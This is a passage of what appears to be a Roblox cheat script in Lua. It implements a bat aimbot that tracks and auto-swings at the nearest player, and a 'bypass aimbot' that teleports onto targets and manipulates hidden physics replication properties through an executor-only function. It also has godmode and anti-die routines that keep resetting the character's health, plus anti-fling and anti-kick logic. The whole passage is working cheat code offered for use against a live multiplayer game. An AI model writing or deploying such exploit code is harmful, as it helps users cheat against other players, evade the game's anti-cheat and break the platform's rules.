    else pcall(function() bat:Activate() end);task.wait(0.15);pcall(function() bat:Activate() end) end
end

function M.startBatCounter()
    if M.Conns.batCounter then return end
    M.Conns.batCounter=RunService.Heartbeat:Connect(function()
        if not M.batCounterEnabled or M.batCounterDebounce then return end
        local char=player.Character;if not char then return end;local hum2=char:FindFirstChildOfClass("Humanoid");if not hum2 then return end
        local st=hum2:GetState()
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            M.batCounterDebounce=true;task.spawn(function() local bat=M.findBatForCounter();if bat then M.swingBatForCounter(bat,char) end;task.wait(0.5);M.batCounterDebounce=false end)
        end
    end)
end

function M.stopBatCounter() if M.Conns.batCounter then M.Conns.batCounter:Disconnect();M.Conns.batCounter=nil end;M.batCounterDebounce=false end




M.aimbotSpeed = 57
M.laggerAimbotSpeed = 45
M._aimbotSwingCooldown = false
M.aimbotHitRange = M.aimbotHitRange or 9.5
M.aimbotLockRange = M.aimbotLockRange or 220
M.aimbotSwingCD = M.aimbotSwingCD or 0.12
M.aimbotHeightOffset = M.aimbotHeightOffset or 1.6
M.aimbotStickyTime = M.aimbotStickyTime or 0.55
M.aimbotRotationEnabled = true 
M.aimbotCameraRotation = false 
M.aimbotRotationSpeed = M.aimbotRotationSpeed or 0.65
M.aimbotCameraSpeed = M.aimbotCameraSpeed or 0.55

function M.findBatForAimbot()
    local char = player.Character
    if not char then return nil end
    local bp = player:FindFirstChild("Backpack")
    
    if M.BAT_COUNTER_SLAP_LIST then
        for _, name in ipairs(M.BAT_COUNTER_SLAP_LIST) do
            local t = char:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
            if t and t:IsA("Tool") then return t end
        end
    end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") then
            local n = tool.Name:lower()
            if n:find("bat") or n:find("slap") then return tool end
        end
    end
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if tool:IsA("Tool") then
                local n = tool.Name:lower()
                if n:find("bat") or n:find("slap") then return tool end
            end
        end
    end
    return nil
end

function M.getClosestTargetAimbot()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end


function M.getAutoBatTarget()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local now = tick()
    if now - (M._aimbotLastScan or 0) <= 0.1 and M._aimbotTarget and M._aimbotTarget.Parent then
        local hum = M._aimbotTarget.Parent:FindFirstChildOfClass("Humanoid")
        if hum and hum.Health > 0 then
            return M._aimbotTarget
        end
    end
    M._aimbotLastScan = now
    M._aimbotTarget = M.getClosestTargetAimbot()
    return M._aimbotTarget
end

function M.getNormalAimbotSpeed()
    
    if M.laggerEnabled then
        return tonumber(M.laggerAimbotSpeed) or tonumber(M.aimbotSpeed) or 57
    end
    return tonumber(M.aimbotSpeed) or 57
end

function M._aimbotSwingBat(char, bat)
    if not bat or not bat.Parent then return end
    if bat.Parent ~= char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then pcall(function() hum:EquipTool(bat) end) end
        return
    end
    pcall(function() bat:Activate() end)
end

function M.startBatAimbot()
    if not M.safeModeTryStart() then return end
    if M.aimbotConn then
        pcall(function() M.aimbotConn:Disconnect() end)
        M.aimbotConn = nil
    end

    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
    end

    M._autoTPWasEnabledForBat = false
    if M.autoTPEnabled then
        M._autoTPWasEnabledForBat = true
        M.stopAutoTP()
        if M.setAutoTPVisual then M.setAutoTPVisual(false) end
    end

    M.autoBatEnabled = true
    M.autoSwingEnabled = true 
    M._aimbotTarget = nil
    M._aimbotLastScan = 0
    M._aimbotTargetLockUntil = 0
    M._aimbotSwingCooldown = false
    M._aimbotLastSwing = 0
    M.autoBatEquippedThisRun = false

    local hum0 = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate = false end

    
    
    
    M.aimbotConn = RunService.Heartbeat:Connect(function()
        if not M.autoBatEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end

        if not char:FindFirstChildOfClass("Tool") then
            local bat = M.findBatForAimbot()
            if bat then pcall(function() hum:EquipTool(bat) end) end
        end

        local target = M.getAutoBatTarget()
        if not target then
            hum.AutoRotate = true
            root.AssemblyAngularVelocity = Vector3.zero
            M._aimbotLookPos = nil
            return
        end
        
        if M.aimbotRotationEnabled ~= false then
            hum.AutoRotate = false
        else
            hum.AutoRotate = true
        end

        local targetVel = target.AssemblyLinearVelocity or Vector3.zero
        local myPos = root.Position
        local targetPos = target.Position
        
        local torso = target.Parent and (target.Parent:FindFirstChild("UpperTorso") or target.Parent:FindFirstChild("Torso"))
        if torso then
            targetPos = torso.Position
        end

        local speed3 = targetVel.Magnitude
        
        local predictTime = math.clamp(0.10 + speed3 / 180, 0.08, 0.22)
        local predictedPos = targetPos + targetVel * predictTime + target.CFrame.LookVector * math.min(speed3 * 0.02, 0.35)

        local direction = predictedPos - myPos
        local flatDir = Vector3.new(direction.X, 0, direction.Z)
        local distFlat = flatDir.Magnitude
        if distFlat > 0.01 then
            flatDir = flatDir.Unit
        else
            flatDir = Vector3.new(0, 0, 1)
        end

        local chaseSpeed = M.getNormalAimbotSpeed()
        local hitRange = tonumber(M.aimbotHitRange) or 9.5
        
        
        if distFlat < hitRange * 0.9 then
            chaseSpeed = math.max(chaseSpeed * 0.85, chaseSpeed * 0.75)
        end

        local desiredHeight = targetPos.Y + 2.2
        local yVel = (desiredHeight - myPos.Y) * 16 + targetVel.Y * 0.55
        if hum.FloorMaterial ~= Enum.Material.Air then
            yVel = math.max(yVel, 8)
        end
        yVel = math.clamp(yVel, -55, 85)
        local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.75)

        local toPredict = predictedPos - myPos

        
        M._aimbotLookPos = predictedPos
        M._aimbotLookFlat = flatDir
        M._aimbotDistFlat = distFlat
        M._aimbotHitRangeNow = hitRange

        
        if M.aimbotRotationEnabled ~= false and toPredict.Magnitude > 0.08 then
            local lookAt = Vector3.new(predictedPos.X, myPos.Y, predictedPos.Z)
            local goalCF = CFrame.lookAt(myPos, lookAt)
            local alpha = distFlat < hitRange and 0.85 or math.clamp(tonumber(M.aimbotRotationSpeed) or 0.5, 0.05, 1)
            root.CFrame = CFrame.new(root.Position) * (root.CFrame:Lerp(goalCF, alpha) - root.CFrame.Position)
            root.AssemblyAngularVelocity = Vector3.zero
        elseif M.aimbotRotationEnabled == false then
            
            local cam = workspace.CurrentCamera
            if cam then
                local lv = cam.CFrame.LookVector
                local lookFlat = Vector3.new(lv.X, 0, lv.Z)
                if lookFlat.Magnitude > 0.05 then
                    lookFlat = lookFlat.Unit
                    local goalCF = CFrame.lookAt(myPos, myPos + lookFlat)
                    root.CFrame = CFrame.new(root.Position) * (goalCF - goalCF.Position)
                    root.AssemblyAngularVelocity = Vector3.zero
                end
            end
        elseif toPredict.Magnitude > 0.1 then
            local goalCF = CFrame.lookAt(myPos, Vector3.new(predictedPos.X, myPos.Y, predictedPos.Z))
            local diffCF = root.CFrame:Inverse() * goalCF
            local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
            rx = math.clamp(rx, -2.5, 2.5)
            ry = math.clamp(ry, -2.5, 2.5)
            rz = math.clamp(rz, -2.5, 2.5)
            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
        end

        
        do
            local now = tick()
            local cd = tonumber(M.aimbotSwingCD) or 0.12
            local dist3 = (targetPos - myPos).Magnitude
            local faceVec = root.CFrame.LookVector
            if M.aimbotRotationEnabled == false then
                local cam = workspace.CurrentCamera
                if cam then
                    local lv = cam.CFrame.LookVector
                    faceVec = Vector3.new(lv.X, 0, lv.Z)
                    if faceVec.Magnitude > 0.01 then faceVec = faceVec.Unit end
                end
            end
            local facing = faceVec:Dot(flatDir)
            local inRange = dist3 <= (hitRange + 1.5)
            
            local aimed = facing > (M.aimbotRotationEnabled == false and 0.35 or 0.55)
            if inRange and aimed and (now - (M._aimbotLastSwing or 0) >= cd) then
                M._aimbotLastSwing = now
                local bat = char:FindFirstChildOfClass("Tool") or M.findBatForAimbot()
                if bat and bat:IsA("Tool") then
                    if bat.Parent ~= char then
                        pcall(function() hum:EquipTool(bat) end)
                    end
                    pcall(function() bat:Activate() end)
                end
            elseif not inRange and (now - (M._aimbotLastSwing or 0) >= cd * 2.5) then
                
                local bat = M.findBatForAimbot()
                if bat and bat.Parent ~= char then
                    pcall(function() hum:EquipTool(bat) end)
                end
            end
        end
    end)

    
    pcall(function() RunService:UnbindFromRenderStep("VynxAimbotRotCam") end)
    RunService:BindToRenderStep("VynxAimbotRotCam", Enum.RenderPriority.Camera.Value + 1, function()
        if not M.autoBatEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local myPos = root.Position
        local lookPos = M._aimbotLookPos

        if M.aimbotRotationEnabled ~= false then
            
            if not lookPos then return end
            local flat = Vector3.new(lookPos.X - myPos.X, 0, lookPos.Z - myPos.Z)
            if flat.Magnitude < 0.05 then return end
            hum.AutoRotate = false
            local goalCF = CFrame.lookAt(myPos, myPos + flat.Unit)
            local distFlat = M._aimbotDistFlat or flat.Magnitude
            local hitRange = M._aimbotHitRangeNow or (tonumber(M.aimbotHitRange) or 9.5)
            local alpha = distFlat < hitRange and 1 or math.clamp(tonumber(M.aimbotRotationSpeed) or 0.55, 0.08, 1)
            local goalOnlyRot = CFrame.new(root.Position) * (goalCF - goalCF.Position)
            if alpha >= 0.99 then
                root.CFrame = goalOnlyRot
            else
                root.CFrame = root.CFrame:Lerp(goalOnlyRot, alpha)
            end
            root.AssemblyAngularVelocity = Vector3.zero
        else
            
            hum.AutoRotate = true
            local cam = workspace.CurrentCamera
            if cam then
                local lv = cam.CFrame.LookVector
                local lookFlat = Vector3.new(lv.X, 0, lv.Z)
                if lookFlat.Magnitude > 0.05 then
                    lookFlat = lookFlat.Unit
                    local goalCF = CFrame.lookAt(myPos, myPos + lookFlat)
                    root.CFrame = CFrame.new(root.Position) * (goalCF - goalCF.Position)
                    root.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end

        
        if false and lookPos then 
            local cam = workspace.CurrentCamera
            if cam then
                local camGoal = lookPos + Vector3.new(0, tonumber(M.aimbotHeightOffset) or 1.6, 0)
                local camCF = CFrame.lookAt(cam.CFrame.Position, camGoal)
                local distFlat = M._aimbotDistFlat or 99
                local hitRange = M._aimbotHitRangeNow or (tonumber(M.aimbotHitRange) or 9.5)
                local camAlpha = distFlat < hitRange and 0.75 or math.clamp(tonumber(M.aimbotCameraSpeed) or 0.45, 0.08, 1)
                cam.CFrame = cam.CFrame:Lerp(camCF, camAlpha)
            end
        end
    end)

    if M.autoBatSetVisual then M.autoBatSetVisual(true) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(true) end
end

function M.stopBatAimbot()
    if M.aimbotConn then
        pcall(function() M.aimbotConn:Disconnect() end)
        M.aimbotConn = nil
    end
    pcall(function() RunService:UnbindFromRenderStep("VynxAimbotRotCam") end)
    M._aimbotLookPos = nil
    M._aimbotTarget = nil
    M._aimbotSwingCooldown = false
    M._aimbotLastSwing = 0
    M._aimbotTargetLockUntil = 0
    M.autoBatEnabled = false
    M.autoBatEquippedThisRun = false

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end
    local hum2 = char and char:FindFirstChildOfClass("Humanoid")
    if hum2 then hum2.AutoRotate = true end

    if M._autoTPWasEnabledForBat then
        M._autoTPWasEnabledForBat = false
        M.autoTPEnabled = true
        if M.setAutoTPVisual then M.setAutoTPVisual(true) end
        M.startAutoTP()
    end

    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
end

function M.queueAutoBatStart()
    if not M.safeModeTryStart() then return end
    if M.antiKickEnabled and M.brainrotDetected then return end
    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
    M.startBatAimbot()
end

function M.swingCurrentBatAimbot(char)
    if not M.autoSwingEnabled then return end
    local bat = M.findBatForAimbot()
    if bat then
        M._aimbotSwingBat(char or player.Character, bat)
    end
end




M._bypassTarget = nil
M._bypassHRP = nil
M._bypassHum = nil
M.tpBatRange = M.tpBatRange or 1e9 
M.tpBatClose = M.tpBatClose or 5 
M.tpBatOffset = M.tpBatOffset or 0
M.tpBatSureHitEnabled = true
M._tpBatLastSwing = 0
M._bypassSwingCooldown = false
M._sureHitCD = false
M._bypassRenderConn = nil 


function M._bypassFindBat()
    local char = player.Character
    if not char then return nil end
    local tool = char:FindFirstChild("Bat")
    if tool and tool:IsA("Tool") then return tool end
    for _, t in ipairs(char:GetChildren()) do
        if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then
            return t
        end
    end
    local bp = player:FindFirstChild("Backpack") or player:FindFirstChildOfClass("Backpack")
    if bp then
        tool = bp:FindFirstChild("Bat")
        if tool and tool:IsA("Tool") then
            tool.Parent = char
            return tool
        end
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then
                t.Parent = char
                return t
            end
        end
    end
    return nil
end


function M._bypassTryHitBat()
    if M._sureHitCD then return end
    M._sureHitCD = true
    pcall(function()
        local bat = M._bypassFindBat()
        if bat then
            bat:Activate()
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then ev:FireServer() end
        end
    end)
    task.delay(0.08, function() M._sureHitCD = false end)
end

function M._bypassGetClosest()
    local root = M._bypassHRP or (player.Character and player.Character:FindFirstChild("HumanoidRootPart"))
    if not root then return nil, math.huge end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and (not hum or hum.Health > 0) then
                local dist = (root.Position - tRoot.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest, minDist
end





function M._bypassClearGodConns()
    for _, key in ipairs({"_bypassGodConn", "_bypassGodHealthConn", "_bypassGodDiedConn", "_bypassGodCharConn", "_bypassGodStateConn"}) do
        local c = M[key]
        if c then pcall(function() c:Disconnect() end); M[key] = nil end
    end
end

function M._bypassProtectCharacter(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    pcall(function()
        hum.MaxHealth = math.max(hum.MaxHealth or 100, 100)
        hum.Health = hum.MaxHealth
        hum.BreakJointsOnDeath = false
        hum.RequiresNeck = false
        hum.PlatformStand = false
        hum.Sit = false
    end)
    if M._bypassGodHealthConn then pcall(function() M._bypassGodHealthConn:Disconnect() end) end
    M._bypassGodHealthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if not M.bypassAimbotEnabled then return end
        pcall(function()
            if hum.Health < (hum.MaxHealth or 100) or hum.Health <= 0 then
                hum.Health = hum.MaxHealth or 100
                hum.PlatformStand = false
                hum.Sit = false
            end
        end)
    end)
    if M._bypassGodDiedConn then pcall(function() M._bypassGodDiedConn:Disconnect() end) end
    M._bypassGodDiedConn = hum.Died:Connect(function()
        if not M.bypassAimbotEnabled then return end
        
        pcall(function()
            hum.BreakJointsOnDeath = false
            hum.Health = hum.MaxHealth or 100
            hum.PlatformStand = false
            hum.Sit = false
            hum:ChangeState(Enum.HumanoidStateType.Running)
            task.defer(function()
                if not M.bypassAimbotEnabled then return end
                pcall(function()
                    hum.Health = hum.MaxHealth or 100
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end)
        end)
    end)
    pcall(function()
        if M._bypassGodStateConn then pcall(function() M._bypassGodStateConn:Disconnect() end) end
        M._bypassGodStateConn = hum.StateChanged:Connect(function(_, new)
            if not M.bypassAimbotEnabled then return end
            if new == Enum.HumanoidStateType.Dead
                or new == Enum.HumanoidStateType.Ragdoll
                or new == Enum.HumanoidStateType.FallingDown
                or new == Enum.HumanoidStateType.Physics then
                pcall(function()
                    hum.Health = hum.MaxHealth or 100
                    hum.PlatformStand = false
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end
        end)
    end)
end




function M._adClearConns()
    for _, key in ipairs({"_antiDieConn", "antiDieConn", "_antiDieCharConn", "_antiDieHealthConn", "_antiDieDiedConn", "_antiDieRenderConn"}) do
        local c = M[key]
        if c then pcall(function() c:Disconnect() end); M[key] = nil end
    end
end

function M._adProtectCharacter(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    pcall(function()
        hum.MaxHealth = math.max(hum.MaxHealth, 100)
        hum.Health = hum.MaxHealth
        hum.BreakJointsOnDeath = false
    end)
    if M._antiDieHealthConn then pcall(function() M._antiDieHealthConn:Disconnect() end) end
    M._antiDieHealthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if not M.antiDieEnabled then return end
        if hum.Health < (hum.MaxHealth or 100) or hum.Health <= 0 then
            pcall(function()
                hum.Health = hum.MaxHealth or 100
                hum.PlatformStand = false
            end)
        end
    end)
    if M._antiDieDiedConn then pcall(function() M._antiDieDiedConn:Disconnect() end) end
    M._antiDieDiedConn = hum.Died:Connect(function()
        if not M.antiDieEnabled then return end
        pcall(function()
            hum.Health = hum.MaxHealth or 100
            hum.PlatformStand = false
            hum.Sit = false
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            task.defer(function()
                pcall(function()
                    hum.Health = hum.MaxHealth or 100
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end)
        end)
    end)
end

function M.startAntiDie()
    M._adClearConns()
    M.antiDieEnabled = true
    local function forceAlive(char)
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hum then return end
        pcall(function()
            hum.BreakJointsOnDeath = false
            hum.RequiresNeck = false
            if hum.MaxHealth < 100 then hum.MaxHealth = 100 end
            if hum.Health < hum.MaxHealth or hum.Health <= 0 then
                hum.Health = hum.MaxHealth
            end
            local st = hum:GetState()
            if st == Enum.HumanoidStateType.Dead
                or st == Enum.HumanoidStateType.FallingDown
                or st == Enum.HumanoidStateType.Ragdoll
                or st == Enum.HumanoidStateType.Physics
                or hum.Health <= 0 then
                hum.Health = hum.MaxHealth
                hum.PlatformStand = false
                hum.Sit = false
                pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
                pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
            end
            
            if hrp and not M.dropActive and not M.bypassAimbotEnabled then
                local v = hrp.AssemblyLinearVelocity
                local maxMove = math.max(tonumber(M.NS) or 60, tonumber(M.CS) or 30, tonumber(M.LAGGER_CARRY_SPEED) or 25, 80) * 2.5
                if v ~= v then
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                elseif v.Magnitude > math.max(maxMove, 500) then
                    hrp.AssemblyLinearVelocity = v.Unit * math.min(v.Magnitude, maxMove)
                    hrp.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end)
    end
    if player.Character then
        M._adProtectCharacter(player.Character)
        forceAlive(player.Character)
    end
    M._antiDieCharConn = player.CharacterAdded:Connect(function(c)
        if not M.antiDieEnabled then return end
        task.wait(0.05)
        M._adProtectCharacter(c)
        forceAlive(c)
        
        local hum = c:FindFirstChildOfClass("Humanoid") or c:WaitForChild("Humanoid", 3)
        if hum then
            pcall(function()
                hum.BreakJointsOnDeath = false
                hum.Died:Connect(function()
                    
                    pcall(function()
                        hum.Health = hum.MaxHealth or 100
                        hum:ChangeState(Enum.HumanoidStateType.Running)
                    end)
                end)
            end)
        end
    end)
    M.antiDieConn = RunService.Heartbeat:Connect(function()
        if not M.antiDieEnabled then return end
        forceAlive(player.Character)
    end)
    if M._antiDieRenderConn then pcall(function() M._antiDieRenderConn:Disconnect() end) end
    M._antiDieRenderConn = RunService.RenderStepped:Connect(function()
        if not M.antiDieEnabled then return end
        forceAlive(player.Character)
    end)
end

function M.stopAntiDie()
    M.antiDieEnabled = false
    M._adClearConns()
    if M._antiDieRenderConn then
        pcall(function() M._antiDieRenderConn:Disconnect() end)
        M._antiDieRenderConn = nil
    end
end





M.antiFlingEnabled = true 
M.antiFlingMaxSpeed = M.antiFlingMaxSpeed or 120
M.antiFlingMaxY = M.antiFlingMaxY or 70
M.antiFlingMaxAng = M.antiFlingMaxAng or 25
M._antiFlingConn = nil

function M.startAntiFling()
    if M._antiFlingConn then
        pcall(function() M._antiFlingConn:Disconnect() end)
        M._antiFlingConn = nil
    end
    M.antiFlingEnabled = true
    M._antiFlingConn = RunService.Heartbeat:Connect(function()
        if not M.antiFlingEnabled then return end
        if M.bypassAimbotEnabled or M.dropActive then return end
        if M.dropActive then return end 
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root then return end

        local cfgMax = math.max(tonumber(M.NS) or 60, tonumber(M.CS) or 30, tonumber(M.LAGGER_CARRY_SPEED) or 25)
        local maxSpd = math.max(tonumber(M.antiFlingMaxSpeed) or 140, cfgMax * 2.2, 200)
        local maxY = math.max(tonumber(M.antiFlingMaxY) or 90, 120)
        local maxAng = tonumber(M.antiFlingMaxAng) or 40

        pcall(function()
            local v = root.AssemblyLinearVelocity
            local bad = false
            if v.Magnitude > maxSpd or math.abs(v.Y) > maxY then
                root.AssemblyLinearVelocity = Vector3.new(
                    math.clamp(v.X, -maxSpd, maxSpd),
                    math.clamp(v.Y, -maxY, maxY),
                    math.clamp(v.Z, -maxSpd, maxSpd)
                )
                bad = true
            end
            local ang = root.AssemblyAngularVelocity
            if ang.Magnitude > maxAng then
                root.AssemblyAngularVelocity = Vector3.zero
                bad = true
            end
            
            if v ~= v or ang ~= ang then
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                bad = true
            end
            if hum then
                if bad then
                    hum.PlatformStand = false
                    hum.Sit = false
                    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
                end
                local st = hum:GetState()
                if st == Enum.HumanoidStateType.Flying
                    or st == Enum.HumanoidStateType.Ragdoll
                    or st == Enum.HumanoidStateType.FallingDown
                    or st == Enum.HumanoidStateType.Physics then
                    if bad or v.Magnitude > maxSpd * 0.7 then
                        pcall(function()
                            hum:ChangeState(Enum.HumanoidStateType.Running)
                            hum.PlatformStand = false
                            hum.Sit = false
                        end)
                    end
                end
            end
        end)
    end)
end

function M.stopAntiFling()
    M.antiFlingEnabled = false
    if M._antiFlingConn then
        pcall(function() M._antiFlingConn:Disconnect() end)
        M._antiFlingConn = nil
    end
end


function M.enableBypassGodmode()
    M.antiDieEnabled = true
    pcall(function() if not M.antiDieConn then M.startAntiDie() end end)
    M._bypassClearGodConns()
    local char = player.Character
    if char then M._bypassProtectCharacter(char) end
    M._bypassGodCharConn = player.CharacterAdded:Connect(function(c)
        if not M.bypassAimbotEnabled then return end
        task.wait(0.05)
        M._bypassProtectCharacter(c)
    end)
    
    M._bypassGodConn = RunService.Heartbeat:Connect(function()
        if not M.bypassAimbotEnabled then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum then return end
        pcall(function()
            hum.BreakJointsOnDeath = false
            if hum.MaxHealth < 100 then hum.MaxHealth = 100 end
            if hum.Health < hum.MaxHealth or hum.Health <= 0 then
                hum.Health = hum.MaxHealth
            end
            hum.PlatformStand = false
            hum.Sit = false
            local st = hum:GetState()
            if st == Enum.HumanoidStateType.Dead
                or st == Enum.HumanoidStateType.Ragdoll
                or st == Enum.HumanoidStateType.FallingDown
                or st == Enum.HumanoidStateType.Physics then
                hum.Health = hum.MaxHealth
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            
            if root then
                local p = root.Position
                if p.Y < -40 or p ~= p or math.abs(p.X) > 1e5 or math.abs(p.Z) > 1e5 then
                    root.CFrame = CFrame.new(p.X, 30, p.Z)
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                    hum.Health = hum.MaxHealth
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end
            end
        end)
    end)
end

function M.disableBypassGodmode()
    M._bypassClearGodConns()
end

function M.startBypassAimbot()
    if not M.safeModeTryStart() then return end
    if M.bypassAimbotConn then
        pcall(function() M.bypassAimbotConn:Disconnect() end)
        M.bypassAimbotConn = nil
    end
    if M._bypassRenderConn then
        pcall(function() M._bypassRenderConn:Disconnect() end)
        M._bypassRenderConn = nil
    end

    
    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
    end

    M._autoTPWasEnabledForBypass = false
    if M.autoTPEnabled then
        M._autoTPWasEnabledForBypass = true
        M.stopAutoTP()
        if M.setAutoTPVisual then M.setAutoTPVisual(false) end
    end

    M.bypassAimbotEnabled = true
    M.enableBypassGodmode()
    
    M.antiDieEnabled = true
    pcall(function()
        if not M.antiDieConn then M.startAntiDie() end
    end)
    M._bypassTarget = nil
    M._bypassSwingCooldown = false
    M._tpBatLastSwing = 0
    M._sureHitCD = false

    local char0 = player.Character
    if char0 then
        M._bypassHRP = char0:FindFirstChild("HumanoidRootPart")
        M._bypassHum = char0:FindFirstChildOfClass("Humanoid")
        if M._bypassHum then
            M.bypassPrevAutoRotate = M._bypassHum.AutoRotate
            M._bypassHum.AutoRotate = false
        end
    end

    
    
    
    
    M.bypassAimbotConn = RunService.Heartbeat:Connect(function()
        if not M.bypassAimbotEnabled then return end
        local char = player.Character
        if not char then return end
        M._bypassHum = char:FindFirstChildOfClass("Humanoid")
        M._bypassHRP = char:FindFirstChild("HumanoidRootPart")
        if not M._bypassHum or not M._bypassHRP then return end

        local target, dist = M._bypassGetClosest()
        if not target then return end
        M._bypassTarget = target

        if sethiddenproperty then
            pcall(function()
                sethiddenproperty(M._bypassHRP, "PhysicsRepRootPart", target)
            end)
        end

        local targetPos = target.Position + Vector3.new(0, 0.9, 0)
        if (M._bypassHRP.Position - targetPos).Magnitude > 8 then
            M._bypassHRP.CFrame = CFrame.new(targetPos)
        end

        local cam = workspace.CurrentCamera
        if cam then
            cam.CFrame = CFrame.new(cam.CFrame.Position, target.Position)
        end
        M._bypassTryHitBat()
    end)

    M._bypassRenderConn = nil


    if M.setBypassVisual then M.setBypassVisual(true) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(true) end
end

function M.stopBypassAimbot()
    if M.bypassAimbotConn then
        pcall(function() M.bypassAimbotConn:Disconnect() end)
        M.bypassAimbotConn = nil
    end
    if M._bypassRenderConn then
        pcall(function() M._bypassRenderConn:Disconnect() end)
        M._bypassRenderConn = nil
    end
    pcall(function() RunService:UnbindFromRenderStep("VynxBypassRotCam") end)
    M._bypassLookPos = nil

    M.bypassAimbotEnabled = false
    M.disableBypassGodmode()
    M._bypassTarget = nil
    M._bypassSwingCooldown = false
    M.bypassHitCD = false
    M._sureHitCD = false
    M._bypassHRP = nil
    M._bypassHum = nil

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end

    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.AutoRotate = (M.bypassPrevAutoRotate == nil) and true or M.bypassPrevAutoRotate
    end

    if M._autoTPWasEnabledForBypass then
        M._autoTPWasEnabledForBypass = false
        M.autoTPEnabled = true
        if M.setAutoTPVisual then M.setAutoTPVisual(true) end
        M.startAutoTP()
    end

    if M.setBypassVisual then M.setBypassVisual(false) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(false) end
end

function M.toggleBypassAimbot()
    M.bypassAimbotEnabled = not M.bypassAimbotEnabled
    if M.bypassAimbotEnabled then
        M.startBypassAimbot()
    else
        M.stopBypassAimbot()
    end
    if M.setBypassVisual then
        M.setBypassVisual(M.bypassAimbotEnabled)
    end
